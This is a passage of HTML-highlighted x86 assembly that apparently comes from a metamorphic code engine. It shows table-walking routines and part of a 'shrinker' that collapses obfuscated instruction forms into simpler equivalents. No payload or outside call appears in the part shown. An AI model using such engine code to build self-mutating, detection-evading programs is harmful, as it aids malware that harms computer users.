                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the label flag</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Return 1 if the instruction has a</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">        </span><span class="sc1">; label pointing to it or 0 if it doesn't have it</span><span class="sc0">
      </span><span class="sc5">@@EndOfScan</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IncreaseEIP2</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function that decreases the instruction pointer. It will decrease while</span><span class="sc0">
</span><span class="sc1">;; the instruction is NOP, unless it's the first or it's labelled.</span><span class="sc0">
</span><span class="sc5">DecreaseEIP</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
     </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; if we are just at the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OK</span><span class="sc0">                          </span><span class="sc1">; beginning, return</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check label</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; If the current instruction is labelled,</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; finish the decreasing</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@OK</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">; Decrease the pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Is it NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">       </span><span class="sc1">; If it is, decrease again</span><span class="sc0">
        </span><span class="sc5">@@OK</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DecreaseEIP</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function that increases the instruction pointer. It will increase until</span><span class="sc0">
</span><span class="sc1">;; the current instruction isn't NOP or it's the last instruction of the code.</span><span class="sc0">
</span><span class="sc5">IncreaseEIP</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Pointing to last instruction?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@_End</span><span class="sc0">          </span><span class="sc1">; If so, end</span><span class="sc0">
       </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Check next</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Last instruction?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@_End</span><span class="sc0">          </span><span class="sc1">; If so, end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if it's labelled</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; If it's labelled, end increasing</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; If it's NOP, increase again</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">
        </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Check if the instruction uses a</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckIfInstructionUsesMem</span><span class="sc0">     </span><span class="sc1">; memory address</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@_End</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OrderRegs</span><span class="sc0">  </span><span class="sc1">; If it uses a memory address, order the</span><span class="sc0">
                                   </span><span class="sc1">; indexes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if the instruction is MOV Mem,Mem</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@_End</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; If it's MOV Mem,Mem, order the indexes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; of the extended part</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OrderRegs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">@@_End</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IncreaseEIP</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to order the indexes in an instruction that uses a memory address.</span><span class="sc0">
</span><span class="sc1">;; If it has a single index, it's set at +1 (since the disassembler maybe put</span><span class="sc0">
</span><span class="sc1">;; it at +2 and set a 8 value in +1). If it has a multiplicator, just leave</span><span class="sc0">
</span><span class="sc1">;; it at +2 (by specifications). If the instruction has two indexes with no</span><span class="sc0">
</span><span class="sc1">;; multiplicators, put the lower one at +1 and other at +2. In case that the</span><span class="sc0">
</span><span class="sc1">;; one at +2 has a multiplicator, the indexes are unexchanged.</span><span class="sc0">
</span><span class="sc5">OrderRegs</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check the index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">; If it doesn't exists, check the</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@_Next</span><span class="sc0">          </span><span class="sc1">; second index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the second index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">         </span><span class="sc1">; If it has a scalar modification (*2,</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@_End</span><span class="sc0">           </span><span class="sc1">; *4 or *8) just leave it.</span><span class="sc0">
                </span><span class="sc1">; At this point, +1 is free and +2 holds an index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Put the index at +1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Free the position at +2</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@_End</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
                </span><span class="sc1">; At this point, we put the lowest at +1. +1 is sure to hold</span><span class="sc0">
                </span><span class="sc1">; a register, so +2 holds another one, 8 (no one) or one with</span><span class="sc0">
                </span><span class="sc1">; multiplicator. In all cases, we can check for the lowest</span><span class="sc0">
                </span><span class="sc1">; number and put it at +1 and we are ordering them (since a</span><span class="sc0">
                </span><span class="sc1">; free position at +2 would be 8, which is always &gt; [+1] or</span><span class="sc0">
                </span><span class="sc1">; would use a scalar, so it would be &gt;= 40h)</span><span class="sc0">
       </span><span class="sc5">@@_Next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the two indexes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; If EAX &gt; EDX, they are already ordered</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@_End</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the lowest at +2 in EDX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the highest at +1 in EAX</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Combine the data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the register at +2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the DWORD at +1 (keep all info)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Merge it with the lowest register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set it at +1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                </span><span class="sc1">; Return with the indexes ordered</span><span class="sc0">
</span><span class="sc5">OrderRegs</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; EDI = Instruction pointer</span><span class="sc0">
</span><span class="sc1">; ECX = Address of last instruction</span><span class="sc0">
</span><span class="sc1">; returns:</span><span class="sc0">
</span><span class="sc1">; EAX != 0 if compressed, EAX = 0 if left unchanged</span><span class="sc0">
</span><span class="sc5">ShrinkThisInstructions</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;; Single instructions. The instructions are converted to their equivalent</span><span class="sc0">
</span><span class="sc1">;;; from the obfuscated form. In this way we also make easier the search of</span><span class="sc0">
</span><span class="sc1">;;; pairs and triplets.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc5">@@Check_Single</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">      </span><span class="sc1">; Check XOR Reg,Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">     </span><span class="sc1">; Maybe it's NOT Reg</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_CommonXOR_s1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the Imm</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_CommonXOR_s1_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Check if it's -1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_SetInstructionECX</span><span class="sc0"> </span><span class="sc1">; If it is, set opcode &lt;ECX&gt;</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_CheckNulOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Check if it's XOR with 0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetNOP</span><span class="sc0"> </span><span class="sc1">; If it's 0, set a NOP</span><span class="sc0">
        </span><span class="sc5">@@Single_SetInstructionECX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Set the opcode in &lt;ECX&gt;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Single_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">       </span><span class="sc1">; Check XOR Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next00_</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">      </span><span class="sc1">; Set NOT Mem if Imm == -1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CommonXOR_s1</span><span class="sc0">

      </span><span class="sc5">@@Single_Next00_</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">       </span><span class="sc1">; Check TEST Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next00__</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">       </span><span class="sc1">; If it is, set TEST Reg,Mem (the other</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0"> </span><span class="sc1">; possibility doesn't exist)</span><span class="sc0">

      </span><span class="sc5">@@Single_Next00__</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; Check TEST Mem,Reg (8 bits)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; It it is, set TEST Reg,Mem (8 bits)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Single_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; XOR Reg8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next02</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">      </span><span class="sc1">; Set NOT if Imm8 == -1</span><span class="sc0">
        </span><span class="sc5">@@Single_Next01_GetSigned</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Single_Next01_NotSigned</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
        </span><span class="sc5">@@Single_Next01_NotSigned</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CommonXOR_s1_2</span><span class="sc0">

      </span><span class="sc5">@@Single_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; XOR Mem8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next03</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">      </span><span class="sc1">; Set NOT if Imm8 == -1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next01_GetSigned</span><span class="sc0">

      </span><span class="sc5">@@Single_Next03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">        </span><span class="sc1">; MOV Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next04</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_CommonMOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Check if source and destiny are</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; the same</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
